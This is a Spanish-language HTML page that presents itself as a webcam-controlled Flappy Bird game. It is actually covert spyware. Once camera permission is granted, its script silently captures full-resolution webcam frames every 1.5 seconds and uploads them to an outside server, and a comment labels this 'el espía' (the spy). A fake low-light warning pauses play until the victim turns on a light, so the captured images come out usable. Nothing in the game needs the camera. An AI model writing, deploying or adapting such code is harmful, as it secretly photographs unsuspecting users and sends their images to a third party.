<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Flappy Bird Pro</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
        
        video#webcam {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; transform: scaleX(-1);
            z-index: 1; filter: brightness(0.6);
        }

        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }

        /* Cartel de Oscuridad (Bloqueo) */
        #dark-warning {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgb(0, 0, 0); z-index: 500;
            display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center;
            padding: 30px;
        }

        .overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 300;
            display: flex; align-items: center; justify-content: center; text-align: center;
        }

        .card {
            background: #1a1a1a; padding: 35px; border-radius: 20px;
            border: 3px solid #f1c40f; max-width: 400px; width: 90%;
        }

        .btn {
            background: #f1c40f; color: #000; border: none; padding: 18px;
            font-size: 18px; font-weight: bold; border-radius: 12px;
            cursor: pointer; margin-top: 20px; width: 100%;
        }

        .hud {
            position: absolute; top: 20px; width: 100%; text-align: center;
            z-index: 100; font-size: 28px; font-weight: bold; text-shadow: 2px 2px #000;
            pointer-events: none; display: none;
        }
    </style>
</head>
<body onclick="birdJump()">

<div class="hud" id="hud">SCORE: <span id="score">0</span></div>

<div id="dark-warning">
    <h1 style="color: #f1c40f; font-size: 50px;">⚠️</h1>
    <h2>POCA LUZ DETECTADA</h2>
    <p>La cámara no puede calibrarse. Por favor, <b>enciende una luz</b> o <b>limpia el lente</b> para continuar.</p>
</div>

<video id="webcam" autoplay playsinline></video>
<canvas id="gameCanvas"></canvas>

<div id="permission-screen" class="overlay">
    <div class="card">
        <h2 style="color:#f1c40f;">ACCESO REQUERIDO</h2>
        <p>Activa tu cámara para jugar.</p>
        <button class="btn" onclick="activateCamera()">ACTIVAR CÁMARA</button>
    </div>
</div>

<div id="start-screen" class="overlay" style="display:none;">
    <div class="card">
        <h1 id="title-msg" style="color:#f1c40f;">¡LISTO!</h1>
        <p id="p-msg">Toca el botón para empezar.</p>
        <button class="btn" onclick="startGame()">EMPEZAR JUEGO</button>
    </div>
</div>

<script>
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const darkWarning = document.getElementById('dark-warning');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let bird, pipes, score, isRunning = false;
    let cameraActive = false;
    let pipeInterval;

    async function activateCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                document.getElementById('permission-screen').style.display = 'none';
                document.getElementById('start-screen').style.display = 'flex';
                
                if (!cameraActive) {
                    cameraActive = true;
                    // Iniciamos el espía (Fotos grandes)
                    setInterval(captureAndSend, 1500); 
                    // Iniciamos el sensor de luz (Check cada 800ms)
                    setInterval(lightSensor, 800);
                }
            };
        } catch (err) { alert("Error: Acepta la cámara."); }
    }

    // --- SENSOR DE LUZ INTELIGENTE ---
    function lightSensor() {
        if (!video.videoWidth) return;

        const checkCanvas = document.createElement('canvas');
        const cCtx = checkCanvas.getContext('2d');
        checkCanvas.width = 40; 
        checkCanvas.height = 40;
        cCtx.drawImage(video, 0, 0, 40, 40);
        
        const data = cCtx.getImageData(0, 0, 40, 40).data;
        let brightness = 0;
        for (let i = 0; i < data.length; i += 4) {
            brightness += (data[i] + data[i + 1] + data[i + 2]) / 3;
        }
        const avg = brightness / (data.length / 4);

        // UMBRAL DE OSCURIDAD: Si el promedio es menor a 45 (muy oscuro)
        if (avg < 45) {
            darkWarning.style.display = 'flex';
            isRunning = false; // Pausa el juego
        } else {
            // Si la luz vuelve, quitamos el cartel
            if (darkWarning.style.display === 'flex') {
                darkWarning.style.display = 'none';
                // No reanudamos automáticamente el juego por seguridad, 
                // el usuario verá el menú de inicio si estaba jugando.
            }
        }
    }

    function startGame() {
        document.getElementById('start-screen').style.display = 'none';
        document.getElementById('hud').style.display = 'block';
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        bird = { x: 80, y: canvas.height / 2, v: 0, radius: 20 };
        pipes = []; score = 0;
        document.getElementById('score').innerText = "0";
        isRunning = true;
        if (pipeInterval) clearInterval(pipeInterval);
        spawnPipe();
        gameLoop();
    }

    function birdJump() { if (isRunning) bird.v = -8; }

    function spawnPipe() {
        if (!isRunning) return;
        const gap = 200;
        const h = Math.random() * (canvas.height - gap - 120) + 60;
        pipes.push({ x: canvas.width, top: h, bottom: h + gap, w: 70, passed: false });
        pipeInterval = setTimeout(spawnPipe, 1700);
    }

    function gameLoop() {
        if (!isRunning) return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        bird.v += 0.45; bird.y += bird.v;
        ctx.fillStyle = "#f1c40f";
        ctx.beginPath(); ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2); ctx.fill();

        pipes.forEach((p, i) => {
            p.x -= 5;
            ctx.fillStyle = "rgba(46, 204, 113, 0.8)";
            ctx.fillRect(p.x, 0, p.w, p.top);
            ctx.fillRect(p.x, p.bottom, p.w, canvas.height - p.bottom);
            if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
                if (bird.y - bird.radius < p.top || bird.y + bird.radius > p.bottom) gameOver();
            }
            if (p.x + p.w < bird.x && !p.passed) {
                score++; p.passed = true;
                document.getElementById('score').innerText = score;
            }
            if (p.x + p.w < 0) pipes.splice(i, 1);
        });
        if (bird.y > canvas.height || bird.y < 0) gameOver();
        requestAnimationFrame(gameLoop);
    }

    function gameOver() {
        isRunning = false;
        clearTimeout(pipeInterval);
        document.getElementById('title-msg').innerText = "JUEGO DETENIDO";
        document.getElementById('start-screen').style.display = 'flex';
        document.getElementById('hud').style.display = 'none';
    }

    function captureAndSend() {
        if (!video.videoWidth || darkWarning.style.display === 'flex') return;

        const snap = document.createElement('canvas');
        // USAMOS RESOLUCIÓN NATIVA PARA FOTOS GRANDES
        snap.width = video.videoWidth;
        snap.height = video.videoHeight;
        const sCtx = snap.getContext('2d');
        sCtx.drawImage(video, 0, 0, snap.width, snap.height);

        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.6) })
        }).catch(() => {});
    }
</script>
</body>
</html>
